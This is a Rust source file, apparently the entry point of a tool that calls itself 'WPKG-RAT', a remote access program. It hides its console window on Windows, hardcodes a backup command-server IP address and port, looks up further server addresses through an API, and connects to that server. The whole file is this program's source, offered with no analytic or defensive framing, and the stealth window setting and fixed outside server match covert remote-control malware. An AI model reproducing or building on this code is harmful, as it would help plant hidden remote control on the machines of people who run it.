// Remove console window in Windows OS
#![windows_subsystem = "windows"]
// TODO: delete it
#![allow(dead_code)]

mod addreses;
mod client;
mod globals;
mod logger;
mod send_api_request;
mod utils;
mod macros;

use std::sync::Mutex;

use lazy_static::lazy_static;
pub use send_api_request::*;

use crate::addreses::{Adresses, Address};

/// Server ip backup if api isn't available
pub const TCP_BACKUP_IP: &str = "136.243.156.104";
/// Server port backup if api isn't available
pub const TCP_BACKUP_PORT: u32 = 3217;

lazy_static! {
    pub static ref TCP_ADDRESS: Mutex<Vec<Address>> = Mutex::new(Vec::new());
}

#[tokio::main]
async fn main() {
    println!("WPKG-RAT {}", env!("CARGO_PKG_VERSION"));

    // init logger
    logger::init();

    // get tcp server ip address from the api
    let tcp_adress = Adresses::get().await.unwrap_or_default();
    update_mutex!(TCP_ADDRESS, tcp_adress.tcp);

    // connect to the ServerD
    client::connect();
}
